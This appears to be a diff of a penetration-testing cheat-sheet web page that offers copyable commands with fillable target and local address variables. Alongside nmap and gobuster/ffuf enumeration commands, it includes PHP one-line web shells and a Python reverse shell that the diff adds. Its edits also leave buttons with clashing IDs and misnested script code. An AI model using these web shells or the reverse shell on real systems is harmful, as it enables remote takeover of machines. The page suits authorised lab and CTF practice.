@@ -22,18 +22,19 @@
     <p>Local IP: <input type="text" name="local-ip" id="local-ip"> <button type="button" id="updateButton4">Reload</button></p>
     <p>Local Port: <input type="text" name="local-port" id="local-port"> <button type="button" id="updateButton5">Reload</button></p>
     
+    <!-- TODO: Exclude environment variables from the replacer. -->
     <h2>Use as a environment variables.</h2>
     <p>For example, you can use the following variables in your terminal.</p>
     <p id="command1">$<span id="commandText1">target_ip="<span id="default-target-ip">192.168.1.2</span>"; echo $target_ip</span><button id="copyButton1">Copy</button></p> 
-    <p>Change Target IP: <input type="text" id="input-target-ip"> <button type="button" id="updateDefaltButton1">Reload</button></p>
+    <p>Target ip: <input type="text" id="input-target-ip"> <button type="button" id="updateDefaltButton">Reload</button></p>
     <p id="command2">$<span id="commandText2">target_port="<span id="default-target-port">80</span>"; echo $target_port</span><button id="copyButton2">Copy</button></p>
-    <p>Change Target Port: <input type="text" id="input-target-port"> <button type="button" id="updateDefaltButton2">Reload</button></p>
+    <p>Target port: <input type="text" id="input-target-port"> <button type="button" id="updateDefaltButton">Reload</button></p>
     <p id="command3">$<span id="commandText3">target_domain="<span id="default-target-domain">example.com</span>"; echo $target_domain</span><button id="copyButton3">Copy</button></p>
-    <p>Change Target Domain: <input type="text" id="input-target-domain"> <button type="button" id="updateDefaltButton3">Reload</button></p>
+    <p>Target domain: <input type="text" id="input-target-domain"> <button type="button" id="updateDefaltButton">Reload</button></p>
     <p id="command4">$<span id="commandText4">local_ip="<span id="default-local-ip">192.168.1.100</span>"; echo $local_ip</span><button id="copyButton4">Copy</button></p>
-    <p>Change Local IP: <input type="text" id="input-local-ip"> <button type="button" id="updateDefaltButton4">Reload</button></p>
+    <p>Local ip: <input type="text" id="input-local-ip"> <button type="button" id="updateDefaltButton">Reload</button></p>
     <p id="command5">$<span id="commandText5">local_port="<span id="default-local-ip">4444</span>"; echo $local_port</span><button id="copyButton5">Copy</button></p>
-    <p>Change Local Port: <input type="text" id="input-local-port"> <button type="button" id="updateDefaltButton5">Reload</button></p>
+    <p>Local port: <input type="text" id="input-local-port"> <button type="button" id="updateDefaltButton">Reload</button></p>
 
     <p>Check the environment variables.</p>
     <pre id="command">
@@ -52,43 +53,44 @@
       $ echo $local_port<br>
       4444</pre>
 
-  <h2>Basic Enumeration</h2>
-  <p>For more details, see <a href="basic_enumeration.html">Basic Enumeration</a>.</p>
-  <h3>Port scan</h3>
-  <h4>Linux</h4>
-  <p id="command6">$<span id="commandText6">nmap -sV -sC -p- --min-rate 5000 $target_ip</span><button id="copyButton6">Copy</button></p>
+    <h2>Basic Enumeration</h2>
+    <p>For more details, see <a href="basic_enumeration.html">Basic Enumeration</a>.</p>
+    <h3>Port scan</h3>
+    <h4>Linux</h4>
+    <p id="command6">$<span id="commandText6">nmap -sV -sC -p- --min-rate 5000 $target_ip</span><button id="copyButton6">Copy</button></p>
 
-  <h4>Windows</h4>
-  <p id="command7">$<span id="commandText7">nmap -sV -sC -p- -Pn --min-rate 5000 $target_ip</span><button id="copyButton7">Copy</button></p>
+    <h4>Windows</h4>
+    <p id="command7">$<span id="commandText7">nmap -sV -sC -p- -Pn --min-rate 5000 $target_ip</span><button id="copyButton7">Copy</button></p>
 
-  <h3>Web Enumeration</h3>
+    <h3>Web Enumeration</h3>
 
-  <h4>Subdomain Enumeration</h4>
-  <p>via gobuster</p>
-  <p id="command8">$<span id="commandText8">gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$target_domain/ -t 50</span><button id="copyButton8">Copy</button></p>
-  <p>via ffuf</p>
-  <p id="command9">$<span id="commandText9">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$target_domain/ -H "Host: FUZZ.$target_domain" -t 50</span><button id="copyButton9">Copy</button></p>
+    <h4>Subdomain Enumeration</h4>
+    <p>via gobuster</p>
+    <p id="command8">$<span id="commandText8">gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$target_domain/ -t 50</span><button id="copyButton8">Copy</button></p>
+    <p>via ffuf</p>
+    <p id="command9">$<span id="commandText9">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$target_domain/ -H "Host: FUZZ.$target_domain" -t 50</span><button id="copyButton9">Copy</button></p>
     
-  <h4>Directory Enumeration</h4>
-  <p>via gobuster</p>
-  <p id="command10">$<span id="commandText10">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 50</span><button id="copyButton10">Copy</button></p>
-  <p>via fuff</p>
-  <p id="command10">$<span id="commandText10">ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$target_domain/FUZZ -t 50</span><button id="copyButton10">Copy</button></p>
+    <h4>Directory Enumeration</h4>
+    <p>via gobuster</p>
+    <p id="command10">$<span id="commandText10">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 50</span><button id="copyButton10">Copy</button></p>
+    <p>via fuff</p>
+    <p id="command10">$<span id="commandText10">ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$target_domain/FUZZ -t 50</span><button id="copyButton10">Copy</button></p>
 
-  <h2>Shell</h2>
-  <p>For more details, see <a href="shell.html">Shell</a>.</p>
+    <h2>Shell</h2>
+    <p>For more details, see <a href="shell.html">Shell</a>.</p>
   
-  <h3>Web Shell</h3>
-  <h4>PHP</h4>
-  <p id="command11">$<span id="commandText11">&lt;?=`$_GET[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
-  <p id="command11">$<span id="commandText11">&lt;?=`$_POST[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
-  <p id="command11">$<span id="commandText11">&lt;?=`$_REQUEST[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
+    <h3>Web Shell</h3>
+    <h4>PHP</h4>
+    <p id="command11">$<span id="commandText11">&lt;?=`$_GET[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
+    <p id="command11">$<span id="commandText11">&lt;?=`$_POST[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
+    <p id="command11">$<span id="commandText11">&lt;?=`$_REQUEST[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
 
-  <h3>Reverse Shell</h3>
-  <h4>python</h4>
+    <h3>Reverse Shell</h3>
+    <h4>python3</h4>
+    <p id="command12">$<span id="commandText12">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$target_ip",$target_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><button id="copyButton12">Copy</button></p>
 
-  <h3>Spawn Shell</h3>
-  <p id="command12">$<span id="commandText12">python3 -c 'import pty; pty.spawn("/bin/bash")'</span><button id="copyButton12">Copy</button></p>
+    <h3>Spawn Shell</h3>
+    <p id="command12">$<span id="commandText12">python3 -c 'import pty; pty.spawn("/bin/bash")'</span><button id="copyButton12">Copy</button></p>
 
 </main>
 
@@ -161,28 +163,27 @@
 
   function updateCommandText(variable, value) {
     var commandTextCount = 15;
+      for (var i = 1; i <= commandTextCount; i++) {
+        var commandTextId = 'commandText' + i;
+        var commandElement = document.getElementById(commandTextId);
+        var commandText = commandElement.innerHTML;
 
-    for (var i = 1; i <= commandTextCount; i++) {
-      var commandTextId = 'commandText' + i;
-      var commandElement = document.getElementById(commandTextId);
+        commandText = commandText.replaceAll(new RegExp('\\' + variable, 'g'), value);
+
+        commandElement.innerHTML = commandText;
+      }
+    }
+
+    document.getElementById('updateDefaltButton1').addEventListener('click', function() {
+    var targetIp = document.getElementById('input-target-ip').value;
+    if (targetIp) {
+      document.getElementById('commandText1').innerHTML = `target_ip="${targetIp}"; echo $target_ip`;
+      var commandElement = document.getElementById('command');
       var commandText = commandElement.innerHTML;
-
-      commandText = commandText.replaceAll(new RegExp('\\' + variable, 'g'), value);
-
+      commandText = commandText.replace(/(\$ echo \$target_ip<br>\n\s*)\S+/, `$1${targetIp}<br>`);
       commandElement.innerHTML = commandText;
     }
-  }
-
-  document.getElementById('updateDefaltButton1').addEventListener('click', function() {
-  var targetIp = document.getElementById('input-target-ip').value;
-  if (targetIp) {
-    document.getElementById('commandText1').innerHTML = `target_ip="${targetIp}"; echo $target_ip`;
-    var commandElement = document.getElementById('command');
-    var commandText = commandElement.innerHTML;
-    commandText = commandText.replace(/(\$ echo \$target_ip<br>\n\s*)\S+/, `$1${targetIp}<br>`);
-    commandElement.innerHTML = commandText;
-  }
-});
+  });
 
   document.getElementById('updateDefaltButton2').addEventListener('click', function() {
     var targetPort = document.getElementById('input-target-port').value;
